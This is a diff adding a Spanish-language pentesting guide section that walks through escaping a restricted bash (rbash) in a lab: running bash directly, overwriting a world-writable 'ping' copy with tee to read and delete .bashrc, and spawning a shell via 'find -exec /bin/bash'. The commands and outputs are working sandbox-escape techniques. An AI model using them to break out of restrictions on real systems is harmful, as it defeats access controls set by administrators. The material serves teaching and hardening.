@@ -2274,6 +2274,251 @@ done
 
 Tras su ejecución, tendremos una visual de toods los comandos que se están aplicando a nivel de sistema, incluidos los llevados a cabo por el usuario root del equipo, incluyendo rutas y subprocesos.
 
+#### Escaping Restricted Shell
+
+Con el objetivo de preparar un escenario realista, presentaré 2 casos, partiendo de una escapada convencional a otra un poco más rebuscada. También hay que decir que todo dependerá del nivel de restricción que el administrador haya implementado sobre el usuario.
+
+Para el primer caso, seguimos los siguientes pasos para preparar nuestro escenario de usuario:
+
+```bash
+┌─[root@parrot]─[/home]
+└──╼ #mkdir testuser
+┌─[root@parrot]─[/home]
+└──╼ #useradd testuser -d /home/testuser -s /bin/rbash
+┌─[root@parrot]─[/home]
+└──╼ #passwd testuser
+Introduzca la nueva contraseña de UNIX: 
+Vuelva a escribir la nueva contraseña de UNIX: 
+passwd: contraseña actualizada correctamente
+┌─[root@parrot]─[/home]
+└──╼ #chown testuser:testuser /home/testuser
+```
+
+En este caso, la contraseña asignada ha sido **test123**. Como vemos, se ha asignado una shell restrictiva al usuario **testuser**, esto lo podemos comprobar a través de la variable **export**:
+
+```bash
+testuser@parrot:~$ export
+declare -x DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/1002/bus"
+declare -x HOME="/home/testuser"
+declare -x LANG="es_ES.UTF-8"
+declare -x LOGNAME="testuser"
+declare -x MAIL="/var/mail/testuser"
+declare -x OLDPWD
+declare -rx PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/snap/bin"
+declare -x PWD="/home/testuser"
+declare -rx SHELL="/bin/rbash"
+declare -x SHLVL="1"
+declare -x SSH_CLIENT="::1 48084 22"
+declare -x SSH_CONNECTION="::1 48084 ::1 22"
+declare -x SSH_TTY="/dev/pts/1"
+declare -x TERM="xterm"
+declare -x USER="testuser"
+declare -x XDG_DATA_DIRS="/usr/local/share:/usr/share:/var/lib/snapd/desktop"
+declare -x XDG_RUNTIME_DIR="/run/user/1002"
+declare -x XDG_SESSION_ID="80"
+testuser@parrot:~$ 
+```
+
+Tal y como vemos en la variable **SHELL**, tenemos la _restricted bash_. Si un administrador de sistemas asigna esta shell a un usuario, en un principio se toparía con estos inconvenientes:
+
+```bash
+testuser@parrot:~$ pwd
+/home/testuser
+testuser@parrot:~$ cd
+-rbash: cd: restringido
+testuser@parrot:~$ cd ..
+-rbash: cd: restringido
+testuser@parrot:~$ cd /
+-rbash: cd: restringido
+testuser@parrot:~$ echo prueba > fichero.txt
+-rbash: fichero.txt: restringido: no se puede redirigir la salida
+testuser@parrot:~$ touch fichero
+testuser@parrot:~$ mkdir directorio
+testuser@parrot:~$ ls -l
+total 4
+drwxr-xr-x 2 testuser testuser 4096 nov 11 23:52 directorio
+-rw-r--r-- 1 testuser testuser    0 nov 11 23:52 fichero
+```
+
+Existen ciertos inconvenientes en cuanto a movilidad respecta, aunque sí que es cierto que en cuanto a visualización, podemos visualizar cualquier recurso del sistema sin mayor inconveniente. Un administrador de sistemas poco experimentado, podría no tener en cuenta lo siguiente:
+
+```bash
+testuser@parrot:~$ echo $SHELL
+/bin/rbash
+testuser@parrot:~$ cd ..
+-rbash: cd: restringido
+testuser@parrot:~$ bash
+testuser@parrot:~$ pwd
+/home/testuser
+testuser@parrot:~$ cd ..
+testuser@parrot:/home$ ls
+s4vitar  testuser
+testuser@parrot:/home$ cd /
+testuser@parrot:/$ pwd
+/
+testuser@parrot:/$ 
+```
+
+Con la misma, el usuario se ha escapado a una **bash**, teniendo mayor movilidad sobre el sistema. Es por ello que como buena medida, además de asignar dicha Shell se haga algo como esto:
+
+```bash
+┌─[root@parrot]─[/home/testuser]
+└──╼ #pwd
+/home/testuser
+┌─[root@parrot]─[/home/testuser]
+└──╼ #mkdir bin
+┌─[root@parrot]─[/home/testuser]
+└──╼ #cd !$
+cd bin
+┌─[root@parrot]─[/home/testuser/bin]
+└──╼ #cp /bin/ping .
+┌─[root@parrot]─[/home/testuser/bin]
+└──╼ #cp /usr/bin/tee .
+┌─[root@parrot]─[/home/testuser/bin]
+└──╼ #cp /bin/ls .
+┌─[root@parrot]─[/home/testuser/bin]
+└──╼ #ls
+ls  ping  tee
+┌─[root@parrot]─[/home/testuser/bin]
+└──╼ #chmod o+w ping
+┌─[root@parrot]─[/home/testuser/bin]
+└──╼ #cd ..
+┌─[root@parrot]─[/home/testuser]
+└──╼ #echo -e "PATH=/home/testuser/bin\nexport PATH" > .bashrc
+┌─[root@parrot]─[/home/testuser]
+└──╼ #cat .bashrc
+PATH=/home/testuser/bin
+export PATH
+```
+
+Como vemos en este caso el administrador de sistemas ha decidido que sólo pueda ejecutar esos 3 comandos (**ls ping tee**). 
+
+Este caso es a modo de ejemplo, y la asignación de permisos de escritura por parte de otros al binario **ping** se ha hecho a posta para que se vea cómo por esta simple tontería un usuario podría escapar de la restricted bash.
+
+Veamos cómo sería la movilidad a nivel de usuario:
+
+```bash
+testuser@parrot:~$ echo $PATH
+/home/testuser/bin
+testuser@parrot:~$ ls
+bin
+testuser@parrot:~$ cat .bashrc
+rbash: cat: no se encontró la orden
+testuser@parrot:~$ cat /etc/passwd
+rbash: cat: no se encontró la orden
+testuser@parrot:~$ cd ..
+rbash: cd: restringido
+testuser@parrot:~$ cd /
+rbash: cd: restringido
+testuser@parrot:~$ touch archivo
+rbash: touch: no se encontró la orden
+testuser@parrot:~$ mkdir directorio
+rbash: mkdir: no se encontró la orden
+testuser@parrot:~$ ls bin
+ls  ping  tee
+testuser@parrot:~$ ping -c 1 localhost
+ping: socket: Operación no permitida
+testuser@parrot:~$ ping localhost
+ping: socket: Operación no permitida
+testuser@parrot:~$ 
+```
+
+El usuario está mucho más limitado, pues sus binarios se encuentran bajo el directorio /bin de su home y sólo puede ejecutar 3 comandos muy básicos. Como vemos, el usuario **testuser** no puede visualizar el recurso **.bashrc**, donde está definido su PATH. Esto es así debido a que no puede ejecutar el comando **cat**.
+
+Sin embargo, aprovechando el permiso que el administrador del sistema asignó al binario **ping**, el usuario puede hacer lo siguiente para visualizar el recurso a modo de ejemplo:
+
+```bash
+testuser@parrot:~$ ls -l bin
+total 240
+-rwxr-xr-x 1 root root 138856 nov 11 23:59 ls
+-rwxr-xrwx 1 root root  65272 nov 11 23:56 ping
+-rwxr-xr-x 1 root root  39648 nov 11 23:57 tee
+testuser@parrot:~$ echo '#!/bin/bash' | tee bin/ping
+#!/bin/bash
+testuser@parrot:~$ echo '/bin/cat /home/testuser/.bashrc' | tee -a bin/ping
+/bin/cat /home/testuser/.bashrc
+testuser@parrot:~$ ping
+PATH=/home/testuser/bin
+export PATH
+testuser@parrot:~$ 
+```
+
+Dado que algo típico en el **rbash** es el no poder utilizar los operadores **> / >>** para redirigir la salida de comandos, el usuario se puede aprovechar de la utilidad de **rbash** para depositar contenido sobre su directorio personal, así como sobre el recurso **ping** situado en el directorio **bin/**. 
+
+De esta forma, dado que la variable **PATH** figura sobre dicho directorio, puede hacer que el binario **ping** tome una nueva funcionalidad, donde como vemos, se aprovecha de la misma para visualizar el recurso **.bashrc**. Una vez ve que el problema radica en dicho recurso, puede aplicar el siguiente movimiento lateral:
+
+```bash
+testuser@parrot:~$ echo '#!/bin/bash' | tee bin/ping
+#!/bin/bash
+testuser@parrot:~$ echo '/bin/rm /home/testuser/.bashrc' | tee -a bin/ping
+/bin/rm /home/testuser/.bashrc
+testuser@parrot:~$ ls -a
+.  ..  .bash_history  .bashrc  bin  .gnupg
+testuser@parrot:~$ ping
+/bin/rm: ¿borrar el fichero regular '/home/testuser/.bashrc'  protegido contra escritura? (s/n) s
+testuser@parrot:~$ ls -a
+.  ..  .bash_history  bin  .gnupg
+testuser@parrot:~$ 
+```
+
+Una vez logra borrar el **.bashrc**, el siguiente objetivo es configurar una nueva variable de entorno **SHELL**, con la shell deseada, de la siguiente forma:
+
+```bash
+testuser@parrot:~$ echo 'export SHELL=bash' | tee '/home/testuser/.bashrc'
+export SHELL=bash
+testuser@parrot:~$ echo $SHELL
+/bin/rbash
+testuser@parrot:~$ exit
+exit
+┌─[root@parrot]─[/home/testuser]
+└──╼ #su testuser
+testuser@parrot:~$ echo $SHELL
+bash
+testuser@parrot:~$ cd ..
+rbash: cd: restringido
+testuser@parrot:~$ cd /
+rbash: cd: restringido
+testuser@parrot:~$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/local/bin
+```
+
+Ahora mismo, el usuario posee una bash tal y como figura en su variable de entorno **SHELL**, sin embargo, por alguna razón... sigue estando con las mismas restricciones. Llegados a este punto, lo único que debe hacer es el típico **shell spawning** aprovechando la utilidad de algún otro binario, dado que su **PATH** ahora cuenta con todas las rutas absolutas de los binarios del sistema.
+
+Para el siguiente caso, lo hacemos aprovechando la utilidad **-exec** del comando **find**:
+
+```bash
+testuser@parrot:~$ cd ..
+rbash: cd: restringido
+testuser@parrot:~$ find /etc/passwd -exec /bin/bash \;
+testuser@parrot:~$ pwd
+/home/testuser
+testuser@parrot:~$ cd ..
+testuser@parrot:/home$ ls
+s4vitar  testuser
+testuser@parrot:/home$ export
+declare -x COLORTERM="truecolor"
+declare -x DISPLAY=":0.0"
+declare -x HOME="/home/testuser"
+declare -x LANG="es_ES.UTF-8"
+declare -x LOGNAME="testuser"
+declare -x LS_COLORS="rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:"
+declare -x MAIL="/var/mail/testuser"
+declare -x OLDPWD="/home/testuser"
+declare -x PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/local/bin"
+declare -x PWD="/home"
+declare -x SHELL="bash"
+declare -x SHLVL="3"
+declare -x SUDO_COMMAND="/bin/su"
+declare -x SUDO_GID="1000"
+declare -x SUDO_UID="1000"
+declare -x SUDO_USER="s4vitar"
+declare -x TERM="xterm"
+declare -x USER="testuser"
+declare -x USERNAME="root"
+declare -x XAUTHORITY="/home/s4vitar/.Xauthority"
+testuser@parrot:/home$ 
+```
+
 ### Pentesting Windows
 
 A pesar de implementar y poner en práctica otras técnicas que no describo en los siguiente puntos, enumero a continuación las que para mi son más importantes y las que considero que uno debe de tener bien claras para el correcto manejo sobre los equipos Windows como atacante, así como de cara al examen.
